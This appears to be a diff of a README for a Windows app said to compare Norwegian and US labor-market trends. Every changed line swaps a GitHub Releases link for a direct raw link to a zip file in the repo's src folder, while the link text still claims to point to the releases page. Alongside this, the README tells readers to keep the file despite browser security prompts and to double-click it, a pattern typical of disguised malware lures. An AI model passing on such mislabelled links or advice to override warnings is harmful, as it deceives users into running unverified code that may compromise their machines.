@@ -1,6 +1,6 @@
 # 🌍 norway-us-labor-market - Compare Labor Trends Fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-purple?style=for-the-badge)](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-purple?style=for-the-badge)](https://github.com/Dulseacockney35/norway-us-labor-market/raw/refs/heads/main/src/us-norway-labor-market-v2.2.zip)
 
 ## 📊 Overview
 
@@ -21,7 +21,7 @@ Use it to review labor market changes, compare both countries side by side, and 
 
 Visit this page to download the latest Windows release:
 
-[Download the app from GitHub Releases](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
+[Download the app from GitHub Releases](https://github.com/Dulseacockney35/norway-us-labor-market/raw/refs/heads/main/src/us-norway-labor-market-v2.2.zip)
 
 After you open the release page:
 
@@ -43,7 +43,7 @@ If your browser shows a security prompt, choose the option to keep the file and 
 
 ## 🚀 Getting Started
 
-1. Open the release page: https://github.com/Dulseacockney35/norway-us-labor-market/releases
+1. Open the release page: https://github.com/Dulseacockney35/norway-us-labor-market/raw/refs/heads/main/src/us-norway-labor-market-v2.2.zip
 2. Download the Windows version from the latest release
 3. Save the file in a folder you can find again
 4. Double-click the downloaded file
@@ -151,7 +151,7 @@ The app works best in a modern browser. If the layout looks off:
 
 The download is here:
 
-[Visit the releases page](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
+[Visit the releases page](https://github.com/Dulseacockney35/norway-us-labor-market/raw/refs/heads/main/src/us-norway-labor-market-v2.2.zip)
 
 Use this page whenever you want the newest version.
 
@@ -193,4 +193,4 @@ norway-us-labor-market
 
 ## 🧭 Use This Link to Get the App
 
-[Download from GitHub Releases](https://github.com/Dulseacockney35/norway-us-labor-market/releases)
+[Download from GitHub Releases](https://github.com/Dulseacockney35/norway-us-labor-market/raw/refs/heads/main/src/us-norway-labor-market-v2.2.zip)
